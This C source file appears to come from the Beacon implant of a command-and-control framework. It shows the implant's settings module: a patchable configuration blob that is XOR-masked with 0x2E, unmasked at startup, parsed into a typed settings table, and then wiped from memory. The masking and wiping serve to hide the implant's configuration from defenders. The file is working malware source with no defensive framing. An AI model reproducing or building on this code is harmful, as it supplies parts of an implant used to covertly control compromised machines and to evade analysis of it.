/* API to retrieve and set Beacon settings */
#include <Windows.h>
#include <stdlib.h>
#include "parse.h"
#include "beacon.h"
#include "track_memory.h"

#define TYPE_NONE  0
#define TYPE_SHORT 1
#define TYPE_INT   2
#define TYPE_PTR   3

typedef struct {
	unsigned short type;
	union {
		unsigned short s_value;
		unsigned int   i_value;
		char *         p_value;
	} value;
} setting;

setting * settings;
void    * beacon_ptr;

setting setting_get(int id) {
	return settings[id];
}

/* PATCH_SIZE = sizeof(arguments) */
#define PATCH_SIZE 4096

/* patch this value with something that matches our arguments structure */
const char mystrs[4096] = "TTTTSSSSUUUUVVVVWWWWXXXXYYYYZZZZ"; /* const puts this right where we want it! */
char myargs[PATCH_SIZE] = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR";

unsigned short setting_short(int field) {
	setting value = setting_get(field);
	if (value.type == TYPE_SHORT)
		return value.value.s_value;

	return 0;
}

unsigned int setting_int(int field) {
	setting value = setting_get(field);
	if (value.type == TYPE_INT)
		return value.value.i_value;

	return 0;
}

unsigned int setting_option(int field, unsigned short value) {
	unsigned short flags = setting_short(field);
	if ((flags & value) == value)
		return TRUE;
	else
		return FALSE;
}

void * get_beacon_ptr() {
	return beacon_ptr;
}

char * setting_ptr(int field) {
	setting value = setting_get(field);
	if (value.type == TYPE_PTR)
		return value.value.p_value;

	return NULL;
}

unsigned int setting_len(int field) {
	return strlen(setting_ptr(field));
}

void settings_init(void * bptr) {
	int   x;
	datap parser;
	short index;
	short type;
	short length;

	/* set our beacon pointer too! */
	beacon_ptr = bptr;

	/* initialize our settings */
	settings = (setting *)malloc(sizeof(setting) * 128); /* allow up to 128 settings */
	memset(settings, 0, sizeof(setting) * 128);
	track_memory_add(settings, sizeof(setting) * 128, TRACK_MEMORY_MALLOC, TRUE, NULL);

	/* unmask myargs */
	for (x = 0; x < PATCH_SIZE; x++) {
		myargs[x] ^= 0x2E;
	}

	/* initialize our parser */
	data_init(&parser, myargs, PATCH_SIZE);

	/* walk myargs and populate settings[id] with our settings. */
	while (TRUE) {
		/* grab our value */
		index = data_short(&parser);
		if (index <= 0)
			break;

		type = data_short(&parser);
		length = data_short(&parser);

		/* populate our setting */
		settings[index].type = type;

		switch (type) {
		case TYPE_SHORT:
			settings[index].value.s_value = data_short(&parser);
			break;
		case TYPE_INT:
			settings[index].value.i_value = data_int(&parser);
			break;
		case TYPE_PTR:
			settings[index].value.p_value = (char *)malloc(length);
			memcpy(settings[index].value.p_value, data_ptr(&parser, length), length);
			track_memory_add(settings[index].value.p_value, length, TRACK_MEMORY_MALLOC, TRUE, NULL);
			break;
		}
	}

	/* remask myargs or 0 it out */
	memset(myargs, 0, PATCH_SIZE);
}
